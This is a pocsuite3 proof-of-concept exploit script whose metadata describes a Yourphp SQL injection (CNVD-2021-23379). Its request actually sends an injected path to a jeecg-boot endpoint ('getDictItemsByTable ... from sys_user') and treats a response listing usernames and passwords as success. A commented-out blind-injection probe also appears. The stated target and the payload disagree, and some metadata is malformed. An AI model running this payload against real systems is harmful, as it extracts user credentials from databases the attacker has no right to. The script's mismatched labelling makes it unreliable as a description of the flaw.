from collections import OrderedDict
import urllib.parse
import re,random
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023'  #漏洞公开的时间,不知道就写今天
    createDate = '20232'  # 编写 PoC 的日期
    updateDate = '2023'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = ''  # 漏洞厂商主页地址
    appName = 'Yourphp'  # 漏洞应用名称
    appVersion = ''''''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        Yourphp SQLI vulnerability(CNVD-2021-23379)
        <p>Yourphp enterprise website management system is a free PHP+MYSQL system, the core is based on the Thinkphp framework highly refined secondary development.</p><p>There is a SQL injection vulnerability in youphp enterprise website management system. An attacker can exploit the vulnerability to obtain database sensitive information.</p>
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def _verify(self):
        result = {}
        path = "/jeecg-boot/sys/ng-alain/getDictItemsByTable/' from sys_user/*, '/x.js"
        #path = "-3426' OR if(ord(substring((version()),1,1))>0,1,0) AND 'a'='a"
        url = self.url + path
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",
                #'Content-Type':'application/x-www-form-urlencoded'
        }
        try:
            resp = requests.get(url=url, headers=headers, verify=False, timeout=10)
            if 'username' in resp.text and 'password' in resp.text and 'as \\\"label\\\",x.js as \\\"value\\\" from' in resp.text :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['message'] = self.url
        except Exception as e:
            return
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)